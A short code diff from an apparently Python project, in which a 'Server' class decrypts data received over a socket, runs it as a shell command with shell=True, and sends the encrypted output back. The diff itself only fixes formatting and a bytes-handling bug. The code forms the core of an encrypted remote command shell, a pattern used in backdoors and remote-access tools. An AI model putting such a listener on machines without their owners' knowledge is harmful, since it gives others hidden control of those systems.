@@ -60,13 +60,13 @@ class Server(Security):
 
                 try:
                     command = decrypted_data
-                    output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
+                    output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                 
                 except:
-                    output = "Failed to execute command."
+                    output = b"Failed to execute command."
 
-                encrypted_reply = self.generate_encrypted_data(output.decode(self.def_encoding))
-
+            encrypted_reply = self.generate_encrypted_data(output.decode(self.def_encoding))
+              
             client_socket.sendall(encrypted_reply.encode(self.def_encoding))
             self.print_and_log(f"\n[+] Sending back reply ({len(encrypted_reply)} Bytes) - {encrypted_reply}")
 
